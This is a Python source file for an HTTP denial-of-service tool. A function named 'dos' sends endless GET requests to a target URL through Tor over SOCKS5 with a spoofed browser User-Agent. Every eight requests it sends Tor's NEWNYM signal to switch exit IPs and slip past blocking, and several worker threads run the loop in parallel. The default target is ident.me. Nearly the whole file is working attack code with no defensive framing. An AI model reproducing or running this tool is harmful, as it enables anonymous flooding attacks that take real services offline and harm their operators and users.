from threading import Thread

from asyncio import unix_events, set_event_loop, new_event_loop

from aiohttp import ClientSession

from aiohttp_socks import ProxyType, ProxyConnector

from stem import Signal

from stem.control import Controller

from argparse import Namespace


__all__ = ['URL', 'PROXY_HOST', 'PROXY_PORT', 'WORKERS', 'dos', 'runner', 'pool']


URL = 'https://ident.me'

PROXY_HOST = 'localhost'

PROXY_PORT = 9050

WORKERS = 8


async def dos(url: str, proxy_host: str, proxy_port: str, worker: int):
    while True:
        # Proxy
        connector = ProxyConnector(
            proxy_type=ProxyType.SOCKS5,
            host=proxy_host,
            port=proxy_port,
            # DNS resolution for Socket
            rdns=True
        )

        # HTTP session
        session = ClientSession(connector=connector)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
            'Connection:': 'keep-alive',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
        }

        for index in range(8):
            async with session.get(url, headers=headers) as response:
                print(f'#{worker + 1} Worker | Request has a {response.status} status code')

        await session.close()

        # New identity
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()

            controller.signal(Signal.NEWNYM)


def runner(args: Namespace, loop: unix_events._UnixSelectorEventLoop, worker: int):
    set_event_loop(loop)

    loop.create_task(dos(args.url, args.proxy_host, args.proxy_port, worker))

    loop.run_forever()


def pool(args: Namespace):
    for worker in range(args.workers):
        loop = new_event_loop()

        thread = Thread(target=runner, args=(args, loop, worker))

        thread.start()
